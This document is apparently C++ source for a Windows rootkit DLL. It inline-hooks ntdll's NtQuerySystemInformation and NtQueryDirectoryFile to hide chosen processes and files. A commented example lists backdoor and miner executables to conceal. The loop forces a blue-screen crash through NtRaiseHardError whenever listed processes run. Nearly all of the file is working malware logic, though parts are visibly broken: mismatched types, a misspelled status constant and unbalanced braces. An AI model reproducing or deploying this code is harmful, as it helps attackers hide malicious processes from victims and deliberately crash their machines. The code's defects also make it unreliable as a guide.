
#include "includes.hpp"
#include "defs.hpp"

#define _WIN32_WINNT 0x0600 // Windows Vista and above

std::vector<const char *> pidstohide = {};

//NTSTATUS WINAPI HOOKED_E

void BSOD(){
    	//Credits: "superblaubeere27" on github
        BOOLEAN PrivilegeState = FALSE;
        ULONG ErrorResponse = 0;
        RtlAdjustPrivilege(19, TRUE, FALSE, &PrivilegeState);
        NtRaiseHardError(STATUS_IN_PAGE_ERROR, 0, 0, NULL, 6, &ErrorResponse);
}

NTSTATUS NTAPI HOOKED_NtQueryDirectoryFile(
    HANDLE FileHandle,
    HANDLE Event,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName,
    BOOLEAN RestartScan
) {

    NTSTATUS status = OriginalNtQueryDirectoryFile(
        FileHandle, Event, ApcRoutine, ApcContext,
        IoStatusBlock, FileInformation, Length,
        FileInformationClass, ReturnSingleEntry,
        FileName, RestartScan
    );

    if (status == STATUS_SUCCES && FileInformation != nullptr){
        PFILE_DIRECTORY_INFORMATION dirinfo = (PFILE_DIRECTORY_INFORMATION)FileInformation;
        while (true){
            bool shouldHide = false;

            for (const auto& item : HideFiles){
                if (_wcsicmp(dirinfo->FileName, item.c_str()) == 0) {
                    shouldHide = true;
                    break;
                }
            }

            if (shouldHide) {
                if (dirinfo->NextEntryOffset != 0){
                    dirinfo = (PFILE_DIRECTORY_INFORMATION)((PBYTE)dirinfo + dirinfo->NextEntryOffset);

                } else {
                    break;
                }
            }

            if (dirinfo->NextEntryOffset == 0) break;

            dirinfo = (PFILE_DIRECTORY_INFORMATION)((PBYTE)dirinfo + dirinfo->NextEntryOffset);
        }
    }
    return status;

}






NTSTATUS NTAPI HOOKED_SYSTEM_PROCESS_INFORMATION(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
) {
    NTSTATUS status = OriginalNtQuerySystemInformation(
        SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength
    );
    if (status == 0) {
        PSSYSTEM_PROCESS_INFORMATION pspi = (PSSYSTEM_PROCESS_INFORMATION)SystemInformation;
        PSSYSTEM_PROCESS_INFORMATION prev = nullptr;
        while (pspi) {
            if (std::find(pidstohide.begin(), pidstohide.end(), pspi->ProcessId) != pidstohide.end()) { 
                if (prev) {
                    if (pspi->NextEntryOffset) {
                        prev->NextEntryOffset += pspi->NextEntryOffset;
                    } else {
                        prev->NextEntryOffset = 0;
                    }
                }
                if (pspi->NextEntryOffset == 0)
                    break;
                pspi = (PSSYSTEM_PROCESS_INFORMATION)((PUCHAR)pspi + pspi->NextEntryOffset);
                continue;
            }
            prev = pspi;
            if (pspi->NextEntryOffset == 0)
                break;
            pspi = (PSSYSTEM_PROCESS_INFORMATION)((PUCHAR)pspi + pspi->NextEntryOffset);
        }
    }
    return status;
}



bool IsProcessRunning(const wchar_t *processName)
{
    bool exists = false;
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (Process32First(snapshot, &entry))
        while (Process32Next(snapshot, &entry))
            if (!wcsicmp(entry.szExeFile, processName))
                exists = true;

    CloseHandle(snapshot);
    return exists;
}





bool CloudHook(LPCSTR Module, NTSTATUS Hook) {
    HMODULE hNtoskrnl = GetModuleHandleA("ntdll.dll"); 
    if (hNtoskrnl == NULL) {
        return false;
    }

    FARPROC ntqsi = GetProcAddress(hNtoskrnl, Module);
    if (ntqsi == NULL) {
        return false;
    }

    OriginalNtQuerySystemInformation = (NtQuerySystemInformation_t)ntqsi;

    DWORD dwOldProtect;
    if (!VirtualProtect(ntqsi, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
        return false;
    }

    BYTE* pFunc = (BYTE*)ntqsi;
    BYTE* pDetour = (BYTE*)&Hook;//&MyNtQuerySystemInformation;
    intptr_t relAddr = (intptr_t)pDetour - (intptr_t)pFunc - 5;

    pFunc[0] = 0xE9; // JMP opcode
    *(int32_t*)(pFunc + 1) = (int32_t)relAddr;

    DWORD temp;
    VirtualProtect(ntqsi, 5, dwOldProtect, &temp);

    return true;
}


BOOL APIENTRY DLLMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpreserved){
    //Initialize Memory Manager. TARGET: explorer.exe since it is always running
    CMemoryManager* MemoryManager = nullptr;

    try {
        MemoryManager = new CMemoryManager("explorer.exe");
    } catch (...) {
        delete MemoryManager;
    }


    //std::vector<const char *> Processes = {
    //    "Backdoor.exe", "Miner.exe", "SomeMore.exe"
    //};

    std::vector<DWORD> pidstohide;

    for (const char  *x : HideProcesses) {
        DWORD pid = MemoryManager->GetProcId(x);
        pidstohide.push_back(pid);
    }

    if (E_HideProcesses){
        bool Hook = CloudHook("NtQuerySystemInformation", (NTSTATUS)HOOKED_SYSTEM_PROCESS_INFORMATION);
    

    

    if (!Hook){
        if (MemoryManager){
            delete MemoryManager;
        }


        exit(1);
    }

    if (E_HideFiles){
        bool Hook = CloudHook("NtQueryDirectoryFile", (NTSTATUS)HOOKED_NtQueryDirectoryFile);
    }

    if (!Hook){
        if (MemoryManager){
            delete MemoryManager;
        }
        exit(1);
    }

    while (true){
        if (BSOD){
            for (auto proc : BSODProcesses){
                if (IsProcessRunning(proc)){
                    BSOD();
                }
            }
        }
        
    }


}